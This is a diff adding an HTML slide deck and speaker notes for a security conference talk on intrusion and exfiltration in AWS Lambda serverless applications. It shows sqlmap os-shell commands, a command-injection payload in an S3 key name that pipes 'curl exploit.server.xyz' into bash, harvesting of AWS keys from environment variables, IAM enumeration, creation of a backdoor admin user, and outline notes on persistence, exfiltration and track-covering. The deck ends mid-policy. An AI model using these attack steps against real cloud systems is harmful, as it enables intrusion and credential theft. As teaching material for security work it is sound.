@@ -1,0 +1,2374 @@
+<!DOCTYPE html><html><head><title></title><meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" /><style type='text/css'>
+body {
+  font-family:'Helvetica';
+  letter-spacing:-5px;
+  background:#000;
+  background-size:100%;
+  color:#fff;
+  margin:0;
+  padding:0;
+  font-weight:bold;
+}
+
+ul, pre {
+  letter-spacing: 0px;
+}
+
+h1, h2, h3, p {
+  margin:0;
+}
+
+em, a {
+  font-style:normal;
+  color: #ff0000;
+}
+
+a {
+  background:#34d0e7;
+  color:#000;
+  text-decoration:none;
+}
+
+img {
+  width:100%;
+}
+
+div {
+  cursor:pointer;
+  cursor:hand;
+  position:absolute;
+  top:0px;
+  left:0px;
+  padding:75px;
+  line-height:97%;
+}
+
+div.center {
+  text-align:center;
+}
+
+div.imageText {
+  text-shadow:0px 0px 5px rgba(0,0,0,0.2);
+}
+
+notes {
+    display:none;
+}
+/* normally not good, but ok in context of full screen directional navigation */
+:focus {
+    outline: 0;
+}
+
+.grey{
+  color: #888;
+}
+
+</style><script type='text/javascript'>
+window.onload = function() {
+  var s = document.getElementsByTagName('div'), ti, i;
+  for (i = 0; i < s.length; i++) s[i].setAttribute('tabindex', 0);
+  if (!s.length) return;
+  var big = window.big = { current: 0, forward: fwd, reverse: rev, go: go, length: s.length };
+  function resize() {
+    var w = window.innerWidth, h = window.innerHeight, e = s[big.current];
+    e.style.fontSize = h + 'px';
+    function pass(cinch, start) {
+      for (var i = start; i > 0 && (e.offsetWidth > w || e.offsetHeight > h); i -= cinch) {
+        e.style.fontSize = i + 'px';
+      }
+      return i + cinch;
+    }
+    pass(2, pass(5, pass(10, h - 2)));
+    e.style.marginTop = (h - e.offsetHeight) / 2 + 'px';
+  }
+  function go(n) {
+    big.current = n;
+    var e = s[n], t = parseInt(e.getAttribute('data-timeToNext') || 0, 10),
+      notes = e.getElementsByTagName('notes');
+    document.body.className = e.getAttribute('data-bodyclass') || '';
+    for (i = 0; i < s.length; i++) s[i].style.display = 'none';
+    e.style.display = 'inline';
+    e.focus();
+    for (i = 0; typeof console === 'object' && i < notes.length; i++) console.log('%c%s: %s', 'padding:5px;font-family:serif;font-size:18px;line-height:150%;', n, notes[i].innerHTML.trim());
+    if (e.firstChild && e.firstChild.nodeName === 'IMG') {
+      document.body.style.backgroundImage = 'url("' + e.firstChild.src + '")';
+      e.firstChild.style.display = 'none';
+      if ('classList' in e) e.classList.add('imageText');
+    } else {
+      document.body.style.backgroundImage = '';
+      document.body.style.backgroundColor = e.style.backgroundColor;
+    }
+    if (ti !== undefined) window.clearInterval(ti);
+    if (t > 0) ti = window.setTimeout(fwd, t * 1000);
+    resize();
+    if (window.location.hash !== n) window.location.hash = n;
+    document.title = e.textContent || e.innerText;
+  }
+  document.onclick = function() { go(++big.current % s.length); };
+  function fwd() { go(Math.min(s.length - 1, ++big.current)); }
+  function rev() { go(Math.max(0, --big.current)); }
+  document.onkeydown = function(e) {
+    if (e.which === 39 || e.which === 34 || e.which === 40) fwd();
+    if (e.which === 37 || e.which === 33 || e.which === 38) rev();
+  };
+  document.ontouchstart = function(e) {
+    var x0 = e.changedTouches[0].pageX;
+    document.ontouchend = function(e2) {
+      var x1 = e2.changedTouches[0].pageX;
+      if (x1 - x0 < 0) fwd();
+      if (x1 - x0 > 0) rev();
+    };
+  };
+  function parse_hash() {
+    return Math.max(Math.min(s.length - 1,
+      parseInt(window.location.hash.substring(1), 10)), 0);
+  }
+  if (window.location.hash) big.current = parse_hash() || big.current;
+  window.onhashchange = function() {
+    i = parse_hash();
+    if (i !== big.current) go(i);
+  };
+  window.onresize = resize;
+  go(big.current);
+};
+</script></head><body>
+
+<!---
+
+PROPOSAL
+
+<p>More and more businesses are moving away from monolithic servers and turning to event-driven microservices powered by cloud function providers like AWS Lambda. So, how do we hack in to a server that only exists for <i>60 milliseconds</i>?</p>
+
+<p>This talk will show novel attack vectors using cloud event sources,  exploitabilities in common server-less patterns and frameworks, abuse of undocumented features in AWS Lambda for persistent malware injection, identifying valuable targets for pilfering, and, of course, how to exfiltrate juicy data out of a secure Virtual Private Cloud. </p>
+
+===
+
+<p>This talk will be the first public anatomy of an attack on a server-less application deployed to AWS Lambda and AWS API Gateway. It'll be useful for any application developer looking to build a server-less application, and for any hacker who's come up against this interesting new class of application.</p>
+
+<p>First, we'll take a look at the current state of server-less architectures and show some common deployment patterns and how they're used in production, comparing the advantages and trade offs against traditional monolithic servers.</p>
+
+<p>Next, we'll explore the attack surface of a server-less application, showing that where Satan closes a door, he opens a window. Using exploitables in common server-less patterns, we'll use cloud event sources as a vector for delivering our obfuscated payload.</p>
+
+<p>Then, we'll use some undocumented features in AWS Lambda to persist our malware, explore the Lambda environment looking for secret keys and other buried treasures, and pillage a remote database.</p>
+
+<p>Finally, we'll use a few more tricks to sneak out of the VPC with our precious data in tow! And, of course, we'll tidy up after ourselves leaving the DevOps team none-the-wiser.</p>
+
+===
+
+<p>I am the author of Zappa, the server-less Python web framework. I've gone very, very deep into this stuff now, and I'd like to share some cool tricks I've found! Attacks against common deployments, things I've seen in the wild, live demo.</p>
+
+<p>I've given a few talks on server-less architectures in Berlin, San Francisco and Oslo, but now I'd like to do a security-specific talk for the hacker crowd.  You can see some examples of my talk style on the slides linked from the Zappa homepage, or directly here: https://htmlpreview.github.io/?https://raw.githubusercontent.com/Miserlou/Talks/master/serverless-sf/big.quickstart.html#37</p>
+
+<p>There should be some cool unpublished information in this talk, not exactly a "zero day" in the strictest sense, but a few things that Amazon should probably patch after this. Key theft, filter bypass, VPC skirting, all that fun stuff.</p>
+
+<p>Please let me know if you have any questions!</p>
+
+-->
+
+<div>
+
+Hello!
+
+</div>
+
+<div>
+My name is <em>Rich Jones</em>!
+</div>
+
+<div>
+Founder/CTO of <em>gun.io</em>!
+</div>
+
+<div>
+<img src="http://i.imgur.com/UmYyAla.png">
+</div>
+
+<div>
+(Awesome freelance gigs for F/OSS hackers!)
+</div>
+
+<div>
+Author of
+</div>
+
+<div>
+<pre>
+
+<em>
+███████╗ █████╗ ██████╗ ██████╗  █████╗
+╚══███╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
+  ███╔╝ ███████║██████╔╝██████╔╝███████║
+ ███╔╝  ██╔══██║██╔═══╝ ██╔═══╝ ██╔══██║
+███████╗██║  ██║██║     ██║     ██║  ██║
+╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝  ╚═╝
+</em>
+</pre>
+</div>
+
+<div>
+The <em>best damn</em> server-less framework in the world!
+</div>
+
+<div>
+First announced at Hack & Tell @ C-Base!
+</div>
+
+<div>
+Welcome to..
+</div>
+
+<div>
+Gone in <em>60 Milliseconds</em>!
+</div>
+
+<div>
+<i>aka</i>
+</div>
+
+<div>
+Intrusion and Exfiltration in <em>Server-less</em> Architectures
+</div>
+
+<div>
+<i>("Oooooooooh!")</i>
+</div>
+
+<!--
+
+- Serverless Overview
+  - Basic Technologies
+  - Challenges
+    - Hard to infiltrate
+    - Hard to persist
+    - Hard to exfiltrate
+
+  - Common Patterns
+    - Web Site
+    - Event Driven (S3)
+    - Hybrid
+    - Identifying Artchitectures
+      - VPC timeout
+
+- Intrusion
+  - Attack surface
+  - Event source as attack vector
+  - Hard Mode (VPC)
+    - Like throwing a penny into a well and listening for the sound
+
+- Harvesting
+  - Application Source Code
+  - Env Vars
+  - Keys, Certs, Database
+  - EC2 Metainfo Server!
+    - Damn! :(
+  - Application Certs
+
+- Exfiltration
+  - Object tags
+    - http://docs.aws.amazon.com/awsconsolehelpdocs/latest/gsg/obtaining-permissions-for-tagging.html
+      - {
+        "Version" : "2012-10-17",
+        "Statement" : [{
+           "Effect" : "Allow",
+           "Action" : [
+              "tag:addResourceTags",
+              "tag:removeResourceTags"
+          ],
+           "Resource" : "*"
+        }]
+    }
+  - VPC Metadata
+
+- Persistence
+  - Steal project source
+  - Update function, roll-back
+  - Can you write to the origin bucket?
+    - CloudFormation managed ones require bucket-reuse - opportunity to persist
+  - Self-infecting, server-less, event-driven malware
+
+- Asides
+  - Site Defacement is awesome, please bring that back
+
+- Ass-wiping
+  - Tag your operations for later deletion
+    - Using features for what they're actually for! :D
+- Future / Open Questions
+
+NOTES
+
+  aws s3api list-buckets --query 'Buckets[].Name'
+
+
+-->
+
+<div>
+¯\_(ツ)_/¯
+</div>
+
+<div>
+<i>aka</i>
+</div>
+
+<div>
+Let's stick it to Jeff Bezos!
+</div>
+
+<div>
+<img src="http://b-i.forbesimg.com/thumbnails/blog_2535/pt_2535_3643_o.jpg?t=1378469756" style="width: 300%">
+</div>
+
+<div>
+Quick poll!
+</div>
+
+<div>
+Who here is familiar with <em>AWS Lambda</em>?
+</div>
+
+<div>
+Okay! Great!
+</div>
+
+<div>
+For the unfamiliar..
+</div>
+
+<div>
+The good old days:
+</div>
+
+<div>
+<img src="http://i.imgur.com/ErMScvt.png">
+</div>
+
+<div>
+<em>One</em> server,
+</div>
+
+<div>
+<em>lots</em> of services!
+</div>
+
+<div>
+<pre>
+$ python sqlmap.py -u "http://spoitabl.co/app.php?id=1" --batch --os-shell
+</pre>
+</div>
+
+<div>
+<pre>
+os-shell >
+</pre>
+</div>
+
+<div>
+Yay! :D
+</div>
+
+<div>
+Now:
+</div>
+
+<div>
+<img src="http://i.imgur.com/2ItfsNN.png">
+<!-- zappa -->
+</div>
+
+<div>
+Every request to an <em>isolated container</em>!
+</div>
+
+<div>
+Every request to an <em>isolated</em>* <em>container</em>!
+</div>
+
+<div>
+No permanent infrastructure!
+</div>
+
+<div>
+Functions triggered by <em>cloud event sources</em>!
+</div>
+
+<div>
+<pre>
+$ python sqlmap.py -u "https://serverless.api/" --batch --os-shell
+</pre>
+</div>
+
+<div>
+<pre>
+  [..]
+  [..]
+  [..]
+</pre>
+</div>
+
+<div>
+<pre>
+$ [*] shutting down at 15:39:31
+</pre>
+</div>
+
+<div>
+Boo! :(
+</div>
+
+<div>
+<i>"so long, shell.php!"</i>
+</div>
+
+<div>
+Common patterns:
+</div>
+
+<div>
+API Gateway -> Lambda
+</div>
+
+<div>
+<img src="http://i.imgur.com/2ItfsNN.png">
+<!-- zappa -->
+</div>
+
+<div>
+S3 -> Lambda -> DynamoDB -> S3
+</div>
+
+<div>
+<img src="http://i.imgur.com/bDnspqM.png">
+<!-- serverless frameworks -->
+</div>
+
+<div>
+Streams / SNS / SES -> Lambda -> SES
+</div>
+
+<div>
+<img src="http://i.imgur.com/yQVxdDM.jpg">
+<!-- lots of events -->
+</div>
+
+<div>
+S3 -> Lambda -> SQS -> EC2
+</div>
+
+<div>
+<img src="http://i.imgur.com/lgHgKtS.jpg">
+<!-- compute cluster -->
+</div>
+
+<div>
+..and many more!
+</div>
+
+<div>
+<i>"Oh no! What does that mean for us?"</i>
+</div>
+
+<div>
+Harder to <em>infiltrate</em>!
+</div>
+
+<div>
+Less common code,
+</div>
+<div>
+isolated functions,
+</div>
+<div>
+isolated services,
+</div>
+<div>
+no users to escalate,
+</div>
+<div>
+no sysadmins to trick!
+</div>
+
+<div>
+:(
+</div>
+
+<div>
+Harder to <em>persist</em>!
+</div>
+
+<div>
+Read only file system!
+</div>
+<div>
+Sub-second lifecycle!
+</div>
+<div>
+No init system to infect!
+</div>
+
+<div>
+:((
+</div>
+
+<div>
+Hard to <em>exfiltrate</em>!
+</div>
+
+<div>
+Virtual Private Cloud!
+</div>
+<div>
+Function-specific roles!
+</div>
+<div>
+Strict permissioning!
+</div>
+<div>
+No reverse shell!
+</div>
+
+<div>
+:(((
+</div>
+
+<div>
+<i>"Oh man, we're totally boned!"</i>
+</div>
+
+<div>
+AWW HELL NAW DOGG!
+</div>
+
+<div>
+When <span class="grey">G̶o̶d̶</span> <em>Bezos</em> closes a door, he opens a window.
+</div>
+
+<div>
+<img src="http://cp91279.biography.com/1000509261001/1000509261001_1791235392001_Bio-Biography-Jeff-Bezos-LF.jpg">
+</div>
+
+<div>
+<img src="https://camo.githubusercontent.com/cb7bc157a9c9a0ff1d93baf24d9833e2fa67779f/687474703a2f2f692e696d6775722e636f6d2f366d644e58506c2e706e67">
+</div>
+
+<div>
+Let's learn some..
+</div>
+
+<div>
+<ul>
+  <li>
+    Reconnaisaince!
+  </li>
+    <li>
+  Infiltration!
+    </li>
+    <li>
+  Exploitation!
+    </li>
+    <li>
+  Exfiltration!
+    </li>
+    <li>
+  Persistence!
+    </li>
+    <li>
+  Clean Up!
+  </li>
+</ul>
+</div>
+
+<div>
+Part 0: <em>Reconnaisaince</em>!
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+<i>"How the hell do we know what we're attacking?"</i>
+</div>
+
+<div>
+Attack surfaces:
+<ul>
+   <li>Outer</li>
+   <li>Inner</li>
+</ul>
+</div>
+
+<div>
+Outer attack surface:
+</div>
+
+<div>
+Web (API Gateway)
+</div>
+
+<div>
+  <pre>
+  X-Amz-Cf-Id: vtLx7D2KHWxwyPgJ2DOE2b6NQ9k0ASMSx66A9LczvEv51aIEIxghGg==
+  X-Amzn-Trace-Id: Root=1-58506411-99598c16af7cbea73728df0d
+  X-Cache: Miss from cloudfront
+  x-amzn-RequestId: c0b23779-c178-11e6-a069-7f6f74d0b328
+  </pre>
+</div>
+
+<div>
+  <pre>
+  X-Amz-Cf-Id: vtLx7D2KHWxwyPgJ2DOE2b6NQ9k0ASMSx66A9LczvEv51aIEIxghGg==
+  X-Amzn-Trace-Id: Root=1-58506411-99598c16af7cbea73728df0d
+  <em>X-Cache: Miss from cloudfront</em>
+  x-amzn-RequestId: c0b23779-c178-11e6-a069-7f6f74d0b328
+  </pre>
+</div>
+
+<div>
+Is it serving <em>dynamic content</em> from a <em>CloudFront</em> distribution?
+</div>
+
+<div>
+File uploads (S3)
+</div>
+
+<div>
+  <pre>
+  Server: <em>AmazonS3</em>
+  x-amz-id-2: KeolF8U+0re0f2YETTY+3PCya1tgbmLIDI4dLrANUJLs6RsF3FFFFeioEb81ls6khCMmzWKzswN8=
+  x-amz-request-id: 81FAFCAD25EAF09B
+  </pre>
+</div>
+
+<div>
+Emails! (SES)
+</div>
+
+<div>
+<pre>
+Date: Sat, 10 Dec 2016 01:26:05 +0000
+From: Herpa Derp <herpa@derp.com>
+To: "your.name@email.tld" <your.name@email.tld>
+Message-ID: <02000158e6564e3f-a857a3dd-4a32-4da6-a3eb-70f0380e9551-000000<em>@email.amazonses.com</em>>
+</pre>
+</div>
+
+<div>
+Inner attack surface:
+</div>
+
+<div>
+Queues! (SQS)
+</div>
+
+<div>
+Are there lots of long running, managed tasks?
+</div>
+
+<div>
+Database Events (RDS/Dynamo)
+</div>
+
+<div>
+Streams! (Kinesis)
+</div>
+
+<div>
+Users! (Cognito)
+</div>
+
+<div>
+Logs! (CloudTrail)
+</div>
+
+<div>
+Part 1: <em>Infiltration</em>
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+<i>"How the hell are we going to weaponize all that?"</i>
+</div>
+
+<div>
+<img src="https://s-media-cache-ak0.pinimg.com/originals/65/3f/14/653f14e54c18e83d6de7c512b3df650f.gif" style="width: 200%; height: 200%">
+</div>
+
+<div>
+<em>Destructive Mechanics</em>
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+Dropping a bolt into the engine and listening to the sound
+</div>
+
+<div>
+<em>TL</em>;<em>DR</em>:
+</div>
+
+<div>
+Attack the glue!
+</div>
+
+<div>
+Unsanitized input
+</div>
+
+<div>
+Deserialization bugs (<i>pickle, Apache commons/ysoserial, JS-Yaml, DeserializeFromBlob</i>)
+</div>
+
+<div>
+Server side script injection
+</div>
+
+<div>
+Malicious binary files (ImageTragick, etc.)
+</div>
+
+<div>
+..and all your favorite web app exploit patterns!
+</div>
+
+<div>
+<i>A quick example</i>
+</div>
+
+<div>
+Vulnerable code:
+</div>
+
+<div>
+<pre>
+<span class="grey"># handler.py</span>
+conn = boto.connect_s3()
+bucket = conn.get_bucket('upload-bucket-public')
+for key in bucket.list():
+    key.get_contents_to_filename("/tmp/" + key.name)
+    os.popen("magic /tmp/" + key.name)
+</pre>
+</div>
+
+<div>
+<img src="http://i.imgur.com/UQg3uso.png" style="width: 300%">
+</div>
+
+<div>
+<pre>
+<span class="grey"># handler.py</span>
+conn = boto.connect_s3()
+bucket = conn.get_bucket('upload-bucket-public')
+for key in bucket.list():
+    key.get_contents_to_filename("/tmp/" + key.name)
+    os.popen("magic /tmp/" + <em>key.name</em>)
+</pre>
+</div>
+
+<div>
+<pre>
+<span class="grey"># handler.py</span>
+conn = boto.connect_s3()
+bucket = conn.get_bucket('upload-bucket-public')
+for key in bucket.list():
+    key.get_contents_to_filename("/tmp/" + key.name)
+    os.popen("magic /tmp/" + <em>"; curl -s exploit.server.xyz | bash"</em>)
+</pre>
+</div>
+
+<div>
+<pre>
+[20/Dec/2016:23:46:37 +0000] "<em>GET / HTTP/1.1</em>" 200 2590 "" "curl/7.43.0" 0/5.315
+</pre>
+</div>
+
+<div>
+Yay! :D
+</div>
+
+<div>
+Part 2: <em>Exploitation</em>
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+<i>
+  "How can we escalate our infection?"
+</i>
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+<i>
+  "What the hell is a Lambda anyway?"
+</i>
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+<i>
+  "What's worth stealing?"
+</i>
+</div>
+
+
+<div>
+<pre>$ find /</pre>
+</div>
+
+<div>
+<em>X</em>
+</div>
+
+<div>
+  <pre>
+  def <em>lambda_handler</em>(event, context):
+    args = ("find", "/")
+    popen = subprocess.Popen(args, stdout=subprocess.PIPE)
+    popen.wait()
+    output = popen.stdout.read()
+    return output
+  </pre>
+</div>
+
+<div>
+<pre>[ results ommited - see my Gists for full listing ]</pre>
+</div>
+
+<div>
+Pretty much looks like like RHEL 6
+</div>
+
+<div>
+Select goodies include: <em>python 2.7</em>, <em>python 3.4</em>, <em>node</em>, <em>perl5</em>, <em>boto3</em>, <em>gcc</em>, <em>curl</em>..
+</div>
+
+<div>
+Decent!
+</div>
+
+<div>
+<pre>$ uname -a</pre>
+</div>
+
+<div>
+<em>X</em>
+</div>
+
+<div>
+  <pre>
+  def <em>lambda_handler</em>(event, context):
+    args = ("uname", "-a")
+    popen = subprocess.Popen(args, stdout=subprocess.PIPE)
+    popen.wait()
+    output = popen.stdout.read()
+    return output
+  </pre>
+</div>
+
+<div>
+  <pre>
+  CPU model :  Intel(R) Xeon(R) CPU E5-2666 v3 @ 2.90GHz
+  Number of cores : 2
+  CPU frequency :  2893.346 MHz
+  Total amount of ram : 3767 MB
+  Total amount of swap : 0 MB
+  System uptime :   1:10,
+  System version: <em>Amazon Linux AMI</em> release 2015.09
+  System kernel: Linux ip-10-13-200-37 4.1.19-24.31.amzn1.x86_64
+  </pre>
+</div>
+
+<div>
+<i>"Okay, that looks like EC2.. can I access the <em>metainfo server</em>?"</i>
+</div>
+
+<div>
+Good idea!
+</div>
+
+<div>
+  <pre>
+  ami-id
+  ami-launch-index
+  ami-manifest-path
+  block-device-mapping/
+  hostname
+  instance-action
+  instance-id
+  instance-type
+  kernel-id
+  local-hostname
+  local-ipv4
+  mac
+  network/
+  placement/
+  public-hostname
+  public-ipv4
+  public-keys/
+  reservation-id
+  security-groups
+  services
+  </pre>
+</div>
+
+<div>
+<pre>
+requests.get("<em>http://169.254.169.254/latest/meta-data/</em>")
+</pre>
+</div>
+
+<div>
+Nice idea, doesn't work :(
+</div>
+
+<div>
+<i>"Hmm.. what's in the environment variables?"</i>
+</div>
+
+<div>
+<pre>
+print os.environ
+</pre>
+</div>
+
+<div>
+<pre>
+{
+  "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
+  "LAMBDA_TASK_ROOT": "/var/task",
+  "PATH": /usr/local/bin:/usr/bin/:/bin",
+  "LD_LIBRARY_PATH": "/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib",
+  "LANG": "en_US.UTF-8",
+  "AWS_LAMBDA_FUNCTION_NAME": "your-function-name",
+  "AWS_REGION": "us-east-1",
+  "AWS_SESSION_TOKEN": "FXXDYXdzEK3//////////SFLKJBSKKLDJFLKJDFLSKJDFLSKJDFLSKJDFLKAJDSLKJHSGF",
+  "AWS_SECURITY_TOKEN": "FXXoDYZdzEK3//////////WELKSDJFLKABFDJa88asdf8asdfF==",
+  "LAMBDA_RUNTIME_DIR": "/var/runtime",
+  "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "512",
+  "PYTHONPATH": "/var/runtime",
+  "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/your-function-name",
+  "AWS_LAMBDA_LOG_STREAM_NAME": "2016/12/13/[$LATEST]448bf3a99b754fe781006b5f6358b67b",
+  "AWS_ACCESS_KEY_ID": "AXYGJHW2H6VG3573NLBQ",
+  "AWS_DEFAULT_REGION": "us-east-1",
+  "AWS_SECRET_ACCESS_KEY": "Wm6QDAOK/lskadfjalskdfJFslakdfj82"
+}
+</pre>
+</div>
+
+<div>
+<pre>
+{
+  "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
+  "LAMBDA_TASK_ROOT": "/var/task",
+  "PATH": /usr/local/bin:/usr/bin/:/bin",
+  "LD_LIBRARY_PATH": "/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib",
+  "LANG": "en_US.UTF-8",
+  "AWS_LAMBDA_FUNCTION_NAME": "your-function-name",
+  "AWS_REGION": "us-east-1",
+  "<em>AWS_SESSION_TOKEN</em>": "FXXDYXdzEK3//////////SFLKJBSKKLDJFLKJDFLSKJDFLSKJDFLSKJDFLKAJDSLKJHSGF",
+  "<em>AWS_SECURITY_TOKEN</em>": "FXXoDYZdzEK3//////////WELKSDJFLKABFDJa88asdf8asdfF==",
+  "LAMBDA_RUNTIME_DIR": "/var/runtime",
+  "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "512",
+  "PYTHONPATH": "/var/runtime",
+  "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/your-function-name",
+  "AWS_LAMBDA_LOG_STREAM_NAME": "2016/12/13/[$LATEST]448bf3a99b754fe781006b5f6358b67b",
+  "<em>AWS_ACCESS_KEY_ID</em>": "AXYGJHW2H6VG3573NLBQ",
+  "AWS_DEFAULT_REGION": "us-east-1",
+  "<em>AWS_SECRET_ACCESS_KEY</em>": "Wm6QDAOK/lskadfjalskdfJFslakdfj82"
+}
+</pre>
+</div>
+
+<div>
+Nice! :)
+</div>
+
+<div>
+<i>"So.. what the heck are those keys anyway?"</i>
+</div>
+
+<div>
+Enter: AWS <em>Identity</em> and <em>Access Management</em> (IAM)
+</div>
+
+<div>
+<em>Per-resource</em> authentication and authorization
+</div>
+
+<div>
+1 task : 1 auth
+</div>
+
+<div>
+Sounds bad. It is.
+</div>
+
+<div>
+The good news:
+</div>
+
+<div>
+<em><i>Really</i></em> easy to fuck up!
+</div>
+
+<div>
+(Especially if you read Amazon's shitty, outdated and incorrect documentation)
+</div>
+
+<div>
+((or the even shittier AWS forum))
+</div>
+
+<div>
+<img src="http://i.imgur.com/z1bVHsV.png">
+</div>
+
+<div>
+Almost everything fun we're going to do depends on slightly <em>wonky IAM</em>..
+</div>
+
+<div>
+:(
+</div>
+
+<div>
+..but that's common.
+</div>
+
+<div>
+:D
+</div>
+
+<div>
+Lambda Execution Policy
+</div>
+
+<div>
+<pre>iam:PassRole</pre>
+</div>
+
+<div>
+Take pre-defined policy,
+</div>
+
+<div>
+create a temporary user with those permissions,
+</div>
+
+<div>
+give those credentials the Lambda userspace.
+</div>
+
+<div>
+<pre>
+<span class="grey">// AWSLambdaVPCAccessExecutionRole</span>
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "logs:CreateLogGroup",
+        "logs:CreateLogStream",
+        "logs:PutLogEvents",
+        "ec2:CreateNetworkInterface",
+        "ec2:DescribeNetworkInterfaces",
+        "ec2:DeleteNetworkInterface"
+      ],
+      "Resource": "*"
+    }
+  ]
+}
+  </pre>
+</div>
+
+<div>
+  <pre>
+<span class="grey">// AWSLambdaVPCAccessExecutionRole</span>
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "logs:<em>Create</em>LogGroup",
+        "logs:<em>Create</em>LogStream",
+        "logs:PutLogEvents",
+        "ec2:<em>Create</em>NetworkInterface",
+        "ec2:<em>Describe</em>NetworkInterfaces",
+        "ec2:DeleteNetworkInterface"
+      ],
+      "Resource": "<em>*</em>"
+    }
+  ]
+}
+  </pre>
+</div>
+
+<div>
+This will come in handy!
+</div>
+
+<div>
+  <i>"Cool, so we can.. describe the network? What about infecting the application source?"</i>
+</div>
+
+<div>
+Where does the code live?
+</div>
+
+<div>
+<pre>
+{
+  "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
+  "<em>LAMBDA_TASK_ROOT</em>": "<em>/var/task</em>",
+  "PATH": /usr/local/bin:/usr/bin/:/bin",
+  "LD_LIBRARY_PATH": "/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib",
+  "LANG": "en_US.UTF-8",
+  "AWS_LAMBDA_FUNCTION_NAME": "your-function-name",
+  "AWS_REGION": "us-east-1",
+  "AWS_SESSION_TOKEN": "FXXDYXdzEK3//////////SFLKJBSKKLDJFLKJDFLSKJDFLSKJDFLSKJDFLKAJDSLKJHSGF",
+  "AWS_SECURITY_TOKEN": "FXXoDYZdzEK3//////////WELKSDJFLKABFDJa88asdf8asdfF==",
+  "LAMBDA_RUNTIME_DIR": "/var/runtime",
+  "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "512",
+  "PYTHONPATH": "/var/runtime",
+  "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/your-function-name",
+  "AWS_LAMBDA_LOG_STREAM_NAME": "2016/12/13/[$LATEST]448bf3a99b754fe781006b5f6358b67b",
+  "AWS_ACCESS_KEY_ID": "AXYGJHW2H6VG3573NLBQ",
+  "AWS_DEFAULT_REGION": "us-east-1",
+  "AWS_SECRET_ACCESS_KEY": "Wm6QDAOK/lskadfjalskdfJFslakdfj82"
+}
+</pre>
+</div>
+
+<div><pre>
+$ cat backdoor >> /var/task/app.py</pre>
+</div>
+
+<div>
+:(
+</div>
+
+<div>
+<em>Read only</em> file-system!
+</div>
+
+<div>
+..and even if you could write to it, it would only live for <em>40 milliseconds</em>.
+</div>
+
+<div>
+<i>"But.. where can I put my tools?.."</i>
+</div>
+
+<div>
+/tmp
+</div>
+
+<div>
+<pre>
+$ touch /tmp/derp
+$ ls /tmp
+derp
+</pre>
+</div>
+
+<div>
+"Ephemeral disk capacity"
+</div>
+
+<div>
+"<em>Ephemeral</em>* disk capacity"
+</div>
+
+<div>
+Lambda executions are <em>NOT</em> completely isolated!
+</div>
+
+<div>
+Cached in memory <em>across</em> executions!
+</div>
+
+<div>
+/tmp == ram disk
+ram == cached
+/tmp == cached
+</div>
+
+<div>
+== storage across multiple executions!
+</div>
+
+<div>
+Yay! :)
+</div>
+
+<div>
+This applies to long-running <em>processes</em> too!
+</div>
+
+<div>
+Linux x86_64 nmap, metasploit, sqlmap, hydra, <em>awscli</em>, etc..
+</div>
+
+<div>
+<i>"So I have some tools and some keys.. what can I do now?"</i>
+</div>
+
+<div>
+First, see what we're allowed to do:
+</div>
+
+<div>
+<pre>
+aws iam list-policies --scope Local
+aws iam list-roles
+aws iam get-policy-version --policy-arn $POLICYARN --version-id v1
+aws iam get-role-policy --role-name $ROLENAME --policy-name $POLICYNAME
+</pre>
+</div>
+
+<div>
+And if we're lucky..
+</div>
+
+<div>
+<pre>
+{
+    "PolicyVersion": {
+        "CreateDate": "2016-01-25T00:28:22Z",
+        "VersionId": "v1",
+        "Document": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Action": [
+                        "<em>*</em>:*</em>"
+                    ],
+                    "Resource": "arn:aws:<em>*</em>:<em>*</em>:<em>*</em>:<em>*</em>",
+                    "Effect": "Allow"
+                },
+            ]
+        },
+        "IsDefaultVersion": true
+    }
+}
+</pre>
+</div>
+
+<div>
+aka
+</div>
+
+<div>
+<i>Jackpot!</i>
+</div>
+
+<div>
+Create new admin user and pillage
+</div>
+
+<div>
+<pre>
+aws iam create-user --user-name ghost
+aws iam create-login-profile --user-name ghost --password spooky
+aws iam create-access-key --user-name ghost
+aws iam add-user-to-group --user-name ghost --group-name Admins
+</pre>
+</div>
+
+<div>
+:D
+</div>
+
+<div>
+<i>
+  Yeah, right!
+</i>
+</div>
+
+<div>
+Far more likely:
+</div>
+
+<div>
+<pre>
+{
+   "Version":"2012-10-17",
+   "Statement":[
+      {
+         "Effect":"Allow",
+         "Action":[
+            "s3:PutObject",
+            "s3:PutObjectTagging",
+            "s3:GetObject",
+            "s3:GetObjectVersion",
+            "s3:DeleteObject",
+            "s3:DeleteObjectVersion",
+            "s3:DeleteObject",
+            "s3:DeleteObjectVersion"
+         ],
+         "Resource":"arn:aws:s3:::my_corporate_bucket/share/marketing/*"
+      }
+   ]
+}
+</pre>
+</div>
+
+<div>
+Or:
+</div>
+
+<div>
+<pre>
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Action": [
+                "dynamodb:DeleteItem",
+                "dynamodb:GetItem",
+                "dynamodb:PutItem",
+                "dynamodb:Scan",
+                "dynamodb:UpdateItem"
+            ],
+            "Resource": "arn:aws:dynamodb:region:accountId:users/*"
+        }
+    ]
+}
+</pre>
+</div>
+
+<div>
+Or:
+</div>
+
+<div>
+<pre>
+"""{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
